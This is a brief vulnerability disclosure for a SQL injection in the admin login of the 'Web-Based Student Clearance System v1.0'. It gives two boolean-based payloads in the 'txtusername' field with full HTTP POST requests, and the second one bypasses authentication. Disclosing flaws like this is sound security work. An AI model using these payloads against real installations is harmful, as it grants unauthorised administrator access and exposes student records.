# Web-Based Student Clearance System v1.0 by Walterjnr1 has SQL injection

BUG_Author:patrik Zhang

vendors:https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html

Vulnerability File: /student_clearance_system_Aurthur_Javis/Admin/login.php

POST parameter 'txtusername' exists SQL injection vulnerability

Payload1: txtusername=ab' OR NOT 2022=2022#&txtpassword=cd&btnlogin=

```
POST /student_clearance_system_Aurthur_Javis/Admin/login.php HTTP/1.1
Host: localhost
Content-Length: 64
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/student_clearance_system_Aurthur_Javis/Admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=m35rlvm4ntdi5lrago4gk6n91m
Connection: close

txtusername=ab%27+OR+NOT+2022%3D2022%23&txtpassword=cd&btnlogin=
```

Login error

![image](https://github.com/byesec/pic/blob/main/errorLogin.png)

Payload2: txtusername=ab' OR NOT 2022=2023#&txtpassword=cd&btnlogin=

```
POST /student_clearance_system_Aurthur_Javis/Admin/login.php HTTP/1.1
Host: localhost
Content-Length: 64
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/student_clearance_system_Aurthur_Javis/Admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=m35rlvm4ntdi5lrago4gk6n91m
Connection: close

txtusername=ab%27+OR+NOT+2022%3D2023%23&txtpassword=cd&btnlogin=
```

Login successful

![image](https://github.com/byesec/pic/blob/main/successLogin.png)

